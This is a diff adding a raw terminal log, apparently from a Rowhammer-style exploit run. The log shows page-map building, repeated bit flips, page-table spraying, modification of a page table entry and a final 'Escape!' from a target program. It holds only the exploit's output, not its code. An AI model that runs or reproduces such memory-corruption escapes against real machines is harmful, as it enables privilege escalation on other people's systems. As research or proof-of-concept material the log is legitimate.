@@ -1,0 +1,145 @@
+root@user-OptiPlex-7010:~/Downloads/36310/out# ./init rez
+PhysPageFinder: Allocate...
+PhysPageFinder: Build page map...
+Entry 0: 0x1caae9000, 0x0592ac000, 0x1cab16468 - found
+Entry 1: 0x1b4c5b000, 0x1c11c3000, 0x1b4c79340 - found
+Entry 2: 0x0795db000, 0x06a59f000, 0x0795f9200 - found
+Entry 3: 0x1af9ed000, 0x1c9f46000, 0x1af9cfa78 - found
+Entry 4: 0x1bfd0f000, 0x0a0e5a000, 0x0a0e781c8 - found
+Entry 5: 0x09255a000, 0x1b89f0000, 0x1b89d2bf8 - found
+Entry 6: 0x0811a4000, 0x1ba30f000, 0x0811c21e0 - found
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+Useful bit flip -- continuing...
+PhysPageFinder: Unmapping...
+Retry...
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+Got 8 hits out of 10
+flip_offset_page=60
+file_size=64 MB
+iterations=42688
+Out of 32 page tables per mmap():
+  Page table 0 requires flip to 1: address is 0x18781c000
+  Page table 1 requires flip to 1: address is 0x185543000
+  Page table 2 requires flip to 1: address is 0x1c68e9000
+  Page table 3 requires flip to 0: address is 0x1be9ff000
+  Page table 4 requires flip to 0: address is 0x1776a9000
+  Page table 5 requires flip to 1: address is 0x14f8ab000
+  Page table 6 requires flip to 1: address is 0x1cd713000
+  Page table 7 requires flip to 0: address is 0x1d3408000
+  Page table 8 requires flip to 0: address is 0x1dd8cd000
+  Page table 9 requires flip to 0: address is 0x1d0f48000
+  Page table 10 requires flip to 0: address is 0x1f7aa8000
+  Page table 11 requires flip to 0: address is 0x1b4b83000
+  Page table 12 requires flip to 1: address is 0x14b97c000
+  Page table 13 requires flip to 0: address is 0x1f3510000
+  Page table 14 requires flip to 0: address is 0x1587f7000
+  Page table 15 requires flip to 1: address is 0x1a0ab2000
+  Page table 16 requires flip to 0: address is 0x1d84bd000
+  Page table 17 requires flip to 0: address is 0x15e8bc000
+  Page table 18 requires flip to 1: address is 0x1c3a46000
+  Page table 19 requires flip to 1: address is 0x148453000
+  Page table 20 requires flip to 0: address is 0x1f1171000
+  Page table 21 requires flip to 1: address is 0x16ccdc000
+  Page table 22 requires flip to 0: address is 0x1bf044000
+  Page table 23 requires flip to 0: address is 0x1b64b4000
+  Page table 24 requires flip to 0: address is 0x19047c000
+  Page table 25 requires flip to 0: address is 0x1d3830000
+  Page table 26 requires flip to 1: address is 0x1864fe000
+  Page table 27 requires flip to 1: address is 0x1a8be3000
+  Page table 28 requires flip to 1: address is 0x1c5357000
+  Page table 29 requires flip to 1: address is 0x1a6c63000
+  Page table 30 requires flip to 1: address is 0x1a7f7c000
+  Page table 31 requires flip to 1: address is 0x1c0a6a000
+pte_pages=32000, pte_size=125 MB, rate=1349.1 MB/sec
+pte_pages=64000, pte_size=250 MB, rate=1486.8 MB/sec
+pte_pages=96000, pte_size=375 MB, rate=1549.5 MB/sec
+pte_pages=128000, pte_size=500 MB, rate=1581.3 MB/sec
+pte_pages=160000, pte_size=625 MB, rate=1601.5 MB/sec
+pte_pages=192000, pte_size=750 MB, rate=1611.8 MB/sec
+pte_pages=224000, pte_size=875 MB, rate=1620.7 MB/sec
+pte_pages=256000, pte_size=1000 MB, rate=1624.2 MB/sec
+pte_pages=288000, pte_size=1125 MB, rate=1628.9 MB/sec
+pte_pages=320000, pte_size=1250 MB, rate=1633.1 MB/sec
+pte_pages=352000, pte_size=1375 MB, rate=1637.2 MB/sec
+pte_pages=384000, pte_size=1500 MB, rate=1639.5 MB/sec
+pte_pages=416000, pte_size=1625 MB, rate=1641.3 MB/sec
+pte_pages=448000, pte_size=1750 MB, rate=1641.6 MB/sec
+pte_pages=480000, pte_size=1875 MB, rate=1641.3 MB/sec
+pte_pages=512000, pte_size=2000 MB, rate=1639.6 MB/sec
+pte_pages=544000, pte_size=2125 MB, rate=1638.1 MB/sec
+pte_pages=576000, pte_size=2250 MB, rate=1637.3 MB/sec
+pte_pages=608000, pte_size=2375 MB, rate=1636.0 MB/sec
+pte_pages=640000, pte_size=2500 MB, rate=1635.8 MB/sec
+pte_pages=672000, pte_size=2625 MB, rate=1635.6 MB/sec
+Retry...
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+  Flip at offset 0x1e0: 0xffffffffefffffff
+    Changed bit 28 to 0
+Got 8 hits out of 10
+pte_pages=704000, pte_size=2750 MB, rate=1008.6 MB/sec
+pte_pages=736000, pte_size=2875 MB, rate=1025.8 MB/sec
+pte_pages=768000, pte_size=3000 MB, rate=1042.0 MB/sec
+pte_pages=800000, pte_size=3125 MB, rate=1056.8 MB/sec
+pte_pages=832000, pte_size=3250 MB, rate=1071.0 MB/sec
+pte_pages=864000, pte_size=3375 MB, rate=1084.9 MB/sec
+pte_pages=896000, pte_size=3500 MB, rate=1097.7 MB/sec
+pte_pages=928000, pte_size=3625 MB, rate=1109.9 MB/sec
+pte_pages=960000, pte_size=3750 MB, rate=1122.0 MB/sec
+pte_pages=992000, pte_size=3875 MB, rate=1133.2 MB/sec
+pte_pages=1024000, pte_size=4000 MB, rate=1144.4 MB/sec
+pte_pages=1056000, pte_size=4125 MB, rate=1154.8 MB/sec
+pte_pages=1088000, pte_size=4250 MB, rate=1165.2 MB/sec
+pte_pages=1120000, pte_size=4375 MB, rate=1175.0 MB/sec
+pte_pages=1152000, pte_size=4500 MB, rate=1184.1 MB/sec
+pte_pages=1184000, pte_size=4625 MB, rate=1193.1 MB/sec
+pte_pages=1216000, pte_size=4750 MB, rate=1201.4 MB/sec
+pte_pages=1248000, pte_size=4875 MB, rate=1115.6 MB/sec
+pte_pages=1280000, pte_size=5000 MB, rate=1124.2 MB/sec
+pte_pages=1312000, pte_size=5125 MB, rate=1132.8 MB/sec
+pte_pages=1344000, pte_size=5250 MB, rate=1140.9 MB/sec
+pte_pages=1366016, pte_size=5336 MB, rate=1146.2 MB/sec
+Running target executable...
+Hello world -- in innocent program
+Trying to cause bit flip...
+Searching for modified PTE...
+  Found at index 0x14db083c
+  In page table 4 (out of 32 per mmap())
+  Entry 0 contains 0x0
+  Entry 60 contains 0x80000001a0ab2027
+Modifying PTE...
+Searching for page that uses this PTE...
+  Found at index 0x249c1e01
+  Points to 0xf000eef3f000eef3
+Running target executable...
+Escape!
+** exited with status 0 (0x0)
+
